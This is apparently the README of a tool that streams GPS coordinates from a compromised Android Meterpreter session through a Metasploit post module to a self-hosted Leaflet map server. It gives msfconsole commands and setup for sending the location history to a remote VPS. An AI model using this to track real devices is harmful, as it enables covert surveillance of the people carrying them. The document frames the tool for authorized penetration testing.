# Cartochron

Cartochron records and displays GPS observations for authorized security
research. It started as `msf-gps-map`, and retains its small HTTP interface
and Metasploit integration. The standalone server can run with an in-memory
SQLite database or preserve observations on disk; the Leaflet map shows the
latest observations. The repository and command filenames are unchanged.

## How it works

1. An authorized Android Meterpreter session provides coordinates to the
   `gps_streamer` post module, using `geolocate` or `wlan_geolocate`.
2. The module posts `{"lat": ..., "lon": ...}` to the map server.
3. `map_server.py` records the observations in SQLite, in RAM by default or
   in a persistent database when `--db` is specified. The browser polls
   `GET /api/points` for the latest 1,000 observations to draw the route.

The Metasploit operator sends HTTP requests directly to the map server.
The Android session does not connect to the map server itself.

## Setup

Python 3 and Ruby (for the Metasploit module) are required. The map server
uses only the Python standard library.

```sh
make                  # Fetch and integrity-check local Leaflet 1.9.4 assets
make install-local    # Install the module into ~/.msf4/modules/
make check            # Run tests; does not require Metasploit or Leaflet assets
```

## Local use (default)

Start the map server:

```sh
python3 map_server.py
```

Open <http://127.0.0.1:8765>. No credentials are required unless you
explicitly enable authentication.

In `msfconsole`, after installing the module:

```text
msf6 > reload_all
msf6 > use post/android/gather/gps_streamer
msf6 post(android/gather/gps_streamer) > set SESSION <id>
msf6 post(android/gather/gps_streamer) > set INTERVAL 3
msf6 post(android/gather/gps_streamer) > run -j
```

The default `ENDPOINT` is `http://127.0.0.1:8765/api/position`.
Stop the background job using `jobs -k <JobID>`.

For a different local port:

```sh
python3 map_server.py --port 9876
```

Set `ENDPOINT` to `http://127.0.0.1:9876/api/position` in the module.

## Recording to a SQLite file (optional)

No database server or Python package installation is needed. The default
command above still holds at most 1,000 observations in memory and discards
them on exit. To preserve observations across restarts:

```sh
install -d -m 700 "$HOME/.local/share/cartochron"
python3 map_server.py --db "$HOME/.local/share/cartochron/observations.sqlite3"
```

`--db` creates a private file (mode `0600`) or opens an existing compatible
Cartochron database. The parent directory must already exist. Existing
world/group-accessible files and unrelated or unsupported schemas are refused.
Protect the database, its directory, and any backups: location history is
sensitive data. Do not commit database files to Git.

**Persistence and map history are different features.** With `--db`, every
accepted observation remains stored, but the current `GET /api/points` API
and Leaflet map show only the *most recent 1,000* observations. Track isolation,
time-range queries, and the historical timeline are planned follow-up changes.
No older rows are silently deleted from a persistent database.

For backups, stop the server before copying the database file, or use SQLite's
backup facilities while it is running. There is no retention or automatic
pruning in persistent mode; the operator owns storage and deletion policy.

## VPS / network use

`--bind` controls the listening IPv4 address (`127.0.0.1` by default),
and `--port` the TCP port (`8765` by default). Both are optional.
The server uses plain HTTP; **Basic authentication does not provide encryption**.
Do not expose location history or credentials to the public Internet over HTTP.

### 1. Set up optional authentication

Create a private credential file on the server, outside the repository:

```sh
install -d -m 700 "$HOME/.config/msf-gps-map"
umask 077
printf 'operator:%s\n' "$(openssl rand -base64 32)" > "$HOME/.config/msf-gps-map/auth"
chmod 600 "$HOME/.config/msf-gps-map/auth"
```

The file contains one ASCII `username:password` line. The first colon
separates the fields; passwords may contain additional colons. The server
reads the file at startup and rejects group/world-accessible files.
Never commit this file to Git or pass credentials in a URL.

Enable it with `--auth-file`:

```sh
python3 map_server.py --port 9876 --auth-file "$HOME/.config/msf-gps-map/auth"
```

A browser now prompts for the same credentials before displaying the map.
`GET /`, static map assets, `GET /api/points`, and `POST /api/position` all
require authentication. Without `--auth-file`, the original unauthenticated
behavior is preserved.

### 2. Make the map accessible remotely

**Recommended for an Internet-facing VPS:** keep Python on loopback and
put a TLS reverse proxy in front of it. For example, with Caddy and a
DNS name pointing to your VPS:

```caddyfile
gps.example.com {
    reverse_proxy 127.0.0.1:9876
}
```

Keep TCP port 9876 blocked from external access; expose only HTTPS on 443.
Open `https://gps.example.com/` in a browser. The reverse proxy must pass
the `Authorization` and `Host` headers (Caddy does this by default).

**For a private VPN or otherwise restricted network:** the server can listen
on all IPv4 interfaces. The port must be reachable only by trusted clients:

```sh
python3 map_server.py --bind 0.0.0.0 --port 9876 \
    --auth-file "$HOME/.config/msf-gps-map/auth"
```

The URL uses your VPS's actual IP or DNS name, **not** `0.0.0.0`.
If you omit `--auth-file` in this mode, both GPS ingestion and the map
history are accessible to anybody who can reach the port.

### 3. Point the Metasploit module at the VPS

On the Metasploit operator's machine:

```text
msf6 post(android/gather/gps_streamer) > set ENDPOINT https://gps.example.com/api/position
msf6 post(android/gather/gps_streamer) > set MAP_USER operator
msf6 post(android/gather/gps_streamer) > set MAP_PASSWORD <password-from-auth-file>
msf6 post(android/gather/gps_streamer) > run -j
```

`MAP_USER` and `MAP_PASSWORD` are optional, but must be supplied together.
They are HTTP Basic credentials for the map server, **not** the `API_KEY`
used by `wlan_geolocate` as a fallback. Do not put the password into
`ENDPOINT`. Metasploit's datastore, command history, and console recordings
may expose values entered using `set`; protect them accordingly.

The module enables TLS for `https://` URLs, uses the system's normal
certificate validation, and reports non-2xx server responses as failures.
Use a valid certificate rather than disabling verification.

## Manual ingestion test

With the default, unauthenticated local server:

```sh
curl -fsS http://127.0.0.1:8765/api/position \
    -H 'Content-Type: application/json' \
    -d '{"lat":47.000,"lon":28.000}'
```

For an authenticated HTTPS server:

```sh
curl -fsS --user operator https://gps.example.com/api/position \
    -H 'Content-Type: application/json' \
    -d '{"lat":47.000,"lon":28.000}'
```

`curl --user operator` prompts for the password without including it in
shell command history.

## Notes

- Without `--db`, at most 1,000 observations are kept in RAM and erased when
  the server exits. With `--db`, all accepted observations are retained on disk.
  There is not yet per-recording-run separation, even in persistent mode.
- `GET /api/points` returns the latest 1,000 observations. Authentication protects
  the viewer and the writer together, not as separate users or roles.
- The server checks Host and Origin headers. Local unauthenticated use retains
  strict loopback Host checking; remote Host names are accepted for network
  listeners and authenticated reverse-proxy deployments.
- Leaflet assets are vendored locally. An Internet connection is still needed
  to load OpenStreetMap tiles. Tile requests can reveal the viewed area to the
  tile provider.
- A public Python `ThreadingHTTPServer` is not a hardened production HTTP
  frontend. Use a reverse proxy, firewall, and sensible connection limits.

## Project files

```text
map_server.py          Python HTTP server and observation API
observation_store.py   SQLite storage (memory or disk)
index.html             Leaflet map viewer
gps_streamer.rb         Metasploit Android post module
vendor_leaflet.py      Downloads and verifies pinned Leaflet assets
tests/                 Python HTTP and Ruby transport tests
Makefile               Vendor, install, and test commands
```

## Disclaimer

Use only for authorized security research, educational demonstrations, and
penetration tests with explicit consent. Unauthorized device tracking or
surveillance is not permitted.

## License

GPL-3.0-or-later; see `COPYING` and `COPYRIGHT`. Vendored Leaflet assets
retain their BSD-2-Clause license.

## Acknowledgments

Leaflet.js, OpenStreetMap contributors, and Rapid7 Metasploit Framework.
